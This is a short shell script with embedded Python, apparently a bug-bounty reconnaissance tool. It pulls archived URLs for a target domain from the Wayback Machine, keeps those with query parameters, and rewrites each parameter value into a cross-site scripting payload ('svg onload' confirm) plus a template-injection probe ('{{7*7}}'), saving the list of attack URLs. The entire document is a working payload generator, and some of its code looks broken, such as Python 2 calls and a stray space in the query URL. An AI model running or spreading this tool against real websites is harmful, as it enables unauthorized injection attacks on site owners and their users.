

for i in $1; do
    python -c 'import urllib;x = raw_input("target: ");link = "http://web.archive.org/cdx/search/cdx?url= "+ x +"/*&output=txt&fl=original&collapse=urlkey&page=/";x = urllib.urlopen(link);myfile = x.read();print(myfile);file = open("sample.txt","w");file.write(myfile);file.close();'
    cat sample.txt | grep "=" >> sample1.txt
    sed 's/=/=hey"><svg\/onload=confirm("xss")>{{7*7}}/g' sample1.txt >> $1.txt
    rm sample.txt sample1.txt
done

